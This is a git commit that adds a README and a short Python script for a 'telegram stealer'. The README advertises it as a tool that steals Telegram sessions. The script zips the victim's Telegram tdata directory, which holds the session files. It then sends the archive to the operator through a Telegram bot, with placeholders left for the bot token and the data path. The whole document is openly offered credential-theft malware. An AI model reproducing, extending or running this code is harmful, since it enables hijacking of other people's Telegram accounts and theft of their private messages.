36e1e48ba18cf701f8f938ecd75d3aa85a00bce9
NeoMetalx1 <153954385+NeoMetalx1@users.noreply.github.com>
2024-05-20 14:37:33 +0300

    Add files via upload

---
+++ README.md
@@ -0,0 +1,19 @@
+
+![logo](https://github.com/NeoMetalx1/py_telegram_stealer/assets/153954385/0a07c3f2-49f2-4913-b54c-dc8aed45cf8a)
+
+_________________________________________________________
+
+🐍Stealer of telegram session, use python language
+
+📩Use telegram bot to send zip file with session
+
+🎉Automatically install depencies
+
+🐱‍👤Simple code that easy to modificate 
+
+😎Enjoy
+_________________________________________________________
+
+❗❗Don't forget to put your discord webhook url
+
+❗❗Don't forget to put telegram directory
---
+++ telegram_stealer_telebot.py
@@ -0,0 +1,31 @@
+import os
+import telebot
+from zipfile import ZipFile, ZIP_DEFLATED
+import zipfile
+
+def depencies_download():
+    os.system(f"pip install telebot")
+    os.system(f"pip install zipfile")
+
+user = os.path.expanduser("#Your_path_to_telegram")
+home = os.path.expanduser('./')
+API_TOKEN = '#Your_telegram_bot_api_token'
+bot = telebot.TeleBot(API_TOKEN)
+
+def zip_arc():
+    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
+        for root, dirs, files in os.walk(user):
+           for file in files:
+                file_path = os.path.join(root, file)
+                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
+zip_arc()
+
+@bot.message_handler(commands=['help', 'start'])
+def on_last_command(message: telebot.types.Message) -> None:
+    with open("./tdata.zip", "rb") as file:
+        bot.send_document(message.chat.id, file)
+
+bot.infinity_polling()
+
+
+
